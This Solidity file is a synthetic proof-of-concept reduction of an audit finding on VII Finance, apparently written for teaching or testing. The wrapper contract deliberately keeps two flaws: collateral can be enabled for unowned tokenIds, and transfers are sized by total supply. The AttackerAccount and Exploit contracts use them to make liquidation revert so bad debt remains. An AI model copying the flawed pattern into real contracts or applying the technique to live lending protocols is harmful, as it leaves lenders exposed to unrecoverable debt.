// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    VII Finance - Liquidations can be made to revert by an attacker
    (Cyfrin 2025-07-15 vii-v2.0; finding #61327, Giovanni Di Siena)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause (minimal path from the report's first PoC): a borrower can
    enableTokenIdAsCollateral for a tokenId they do NOT hold. Combined with
    normalizedToFull using totalSupply(tokenId) (finding #61329), liquidation
    transfer computes a non-zero ERC-6909 amount for that unowned tokenId and
    reverts with ERC6909InsufficientBalance - permanently DoS-ing liquidation
    of the underwater account so bad debt can accrue.

    Vulnerable normalizedToFull line preserved with @> VULN; enable-without-balance
    is the complementary missing guard.
//////////////////////////////////////////////////////////////////////////*/

library Math {
    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        require(denominator > 0, "div0");
        unchecked {
            result = (x * y) / denominator;
        }
    }
}

/// @notice Reduced ERC721WrapperBase with enable-without-balance + buggy normalizedToFull.
contract ERC721WrapperBase {
    mapping(uint256 => uint256) public totalSupplyOf;
    mapping(address => mapping(uint256 => uint256)) public balanceOfToken;
    mapping(address => uint256[]) internal _enabledTokenIds;
    mapping(address => mapping(uint256 => bool)) internal _isEnabled;

    function totalSupply(uint256 tokenId) public view returns (uint256) {
        return totalSupplyOf[tokenId];
    }

    function balanceOf(address account, uint256 tokenId) public view returns (uint256) {
        return balanceOfToken[account][tokenId];
    }

    /// @dev Unit-of-account value = sum of ERC-6909 balances of enabled tokenIds.
    function balanceOf(address account) public view returns (uint256 total) {
        uint256 n = _enabledTokenIds[account].length;
        for (uint256 i = 0; i < n; ++i) {
            total += balanceOfToken[account][_enabledTokenIds[account][i]];
        }
    }

    function totalTokenIdsEnabledBy(address account) public view returns (uint256) {
        return _enabledTokenIds[account].length;
    }

    function tokenIdOfOwnerByIndex(address account, uint256 index) public view returns (uint256) {
        return _enabledTokenIds[account][index];
    }

    /// @notice No check that msg.sender holds any ERC-6909 of tokenId.
    function enableTokenIdAsCollateral(uint256 tokenId) external {
        // Missing: require(balanceOfToken[msg.sender][tokenId] > 0)
        // FIX: require(balanceOfToken[msg.sender][tokenId] > 0, "no balance");
        if (_isEnabled[msg.sender][tokenId]) return;
        _isEnabled[msg.sender][tokenId] = true;
        _enabledTokenIds[msg.sender].push(tokenId); // companion surface: enable without balance
    }

    function seedWrap(uint256 tokenId, address to, uint256 supply) external {
        require(totalSupplyOf[tokenId] == 0, "exists");
        totalSupplyOf[tokenId] = supply;
        balanceOfToken[to][tokenId] = supply;
    }

    /// @notice Value-denominated transfer used by liquidation.
    function transfer(address to, uint256 amount) external returns (bool) {
        address sender = msg.sender;
        uint256 currentBalance = balanceOf(sender);
        require(currentBalance > 0, "no collateral value");

        uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);
        for (uint256 i = 0; i < totalTokenIds; ++i) {
            uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
            _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance));
        }
        return true;
    }

    function _transfer(address from, address to, uint256 tokenId, uint256 amount) internal {
        // Matches report: ERC6909InsufficientBalance when amount > balance
        require(
            balanceOfToken[from][tokenId] >= amount,
            "ERC6909InsufficientBalance"
        );
        balanceOfToken[from][tokenId] -= amount;
        balanceOfToken[to][tokenId] += amount;
    }

    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance)
        public
        view
        returns (uint256)
    {
        // @audit => multiplying by the total ERC-6909 supply of the specified tokenId is incorrect
        return Math.mulDiv(amount, totalSupply(tokenId), currentBalance); // @> VULN: totalSupply inflates transfer for unowned/partial tokenIds
        // FIX: return Math.mulDiv(amount, balanceOfToken[msg.sender][tokenId], currentBalance);
        //      (zero balance → zero transfer; enable-without-balance becomes harmless)
    }
}

/// @notice Minimal vault: liquidate seizes collateral via wrapper.transfer.
contract EVault {
    ERC721WrapperBase public immutable wrapper;
    mapping(address => uint256) public debt;
    mapping(address => bool) public collateralEnabled;

    constructor(ERC721WrapperBase w) {
        wrapper = w;
    }

    function enableCollateral(address account) external {
        collateralEnabled[account] = true;
    }

    function borrow(uint256 amount, address onBehalf) external {
        require(collateralEnabled[onBehalf], "no coll");
        require(wrapper.balanceOf(onBehalf) > 0, "no value");
        debt[onBehalf] += amount;
    }

    /// @dev Simplified liquidate: seizes `yield` unit-of-account of wrapper collateral.
    function liquidate(address violator, address /*collateral*/, uint256 /*repay*/, uint256 minYield)
        external
        returns (uint256 yield)
    {
        require(debt[violator] > 0, "no debt");
        // Underwater: seize half of collateral value (simplified)
        yield = wrapper.balanceOf(violator) / 2;
        if (yield < minYield) yield = minYield;
        // Liquidation calls the wrapper's value-denominated transfer as the violator
        // (in real EVK this is via EVC authentication; here we simulate by requiring
        // the wrapper transfer to be invoked through a liquidate hook on the violator).
        // For the synthetic: EVault is approved to call transferFromViolator.
        IViolator(violator).seizeTo(msg.sender, yield);
        debt[violator] = 0;
    }
}

interface IViolator {
    function seizeTo(address to, uint256 amount) external;
}

/// @dev Malicious account that enables unowned collateral and borrows.
contract AttackerAccount is IViolator {
    ERC721WrapperBase public immutable wrapper;
    EVault public immutable vault;
    address public owner;

    constructor(ERC721WrapperBase w, EVault v) {
        wrapper = w;
        vault = v;
        owner = msg.sender;
    }

    function setupAndBorrow(uint256 ownedTokenId, uint256 unownedTokenId, uint256 borrowAmt) external {
        // Enable BOTH owned and unowned tokenIds as collateral
        wrapper.enableTokenIdAsCollateral(ownedTokenId);
        wrapper.enableTokenIdAsCollateral(unownedTokenId); // zero balance - missing guard
        vault.enableCollateral(address(this));
        vault.borrow(borrowAmt, address(this));
    }

    /// @dev Called by vault during liquidate - attempts value transfer of collateral.
    function seizeTo(address to, uint256 amount) external {
        require(msg.sender == address(vault), "vault only");
        wrapper.transfer(to, amount); // reverts when unowned tokenId inflates transfer
    }
}

/// @notice Demonstrates liquidation DoS via enable-unowned-collateral + transfer inflation.
contract Exploit {
    ERC721WrapperBase public wrapper; // CREATE nonce 1
    EVault public vault; // CREATE nonce 2
    AttackerAccount public attacker; // CREATE nonce 3

    uint256 public constant TOKEN_ID_1 = 1; // held by honest depositor (not attacker)
    uint256 public constant TOKEN_ID_2 = 2; // held by attacker
    uint256 public constant SUPPLY = 100;

    bool public liquidationReverted;
    uint256 public attackerDebtAfterFailedLiq;

    constructor() {
        wrapper = new ERC721WrapperBase();
        vault = new EVault(wrapper);
        attacker = new AttackerAccount(wrapper, vault);
    }

    function run() external {
        address honest = address(0xB0B);
        address liquidator = address(this);

        // 1. Honest user wraps tokenId1; attacker wraps tokenId2
        wrapper.seedWrap(TOKEN_ID_1, honest, SUPPLY);
        wrapper.seedWrap(TOKEN_ID_2, address(attacker), SUPPLY);

        // 2. Attacker enables both tokenId1 (unowned!) and tokenId2, borrows max
        attacker.setupAndBorrow(TOKEN_ID_2, TOKEN_ID_1, 50);
        require(vault.debt(address(attacker)) == 50, "debt set");

        // 3. Liquidator attempts liquidation - transfer reverts on unowned tokenId1
        //    normalizedToFull(tokenId1, yield, bal) = yield * totalSupply(1) / bal
        //    = 50 * 100 / 100 = 50, but attacker balance of tokenId1 is 0 → revert
        liquidationReverted = false;
        try vault.liquidate(address(attacker), address(wrapper), 50, 0) {
            liquidationReverted = false;
        } catch {
            liquidationReverted = true;
        }

        require(liquidationReverted, "harm: liquidation must revert");
        attackerDebtAfterFailedLiq = vault.debt(address(attacker));
        require(attackerDebtAfterFailedLiq == 50, "debt remains - bad debt can accrue");

        // Harm demonstrated: underwater account cannot be liquidated; debt sticks.
        // (zero-profit / liveness finding)
        require(liquidator == address(this), "liq"); // keep liquidator referenced
    }
}
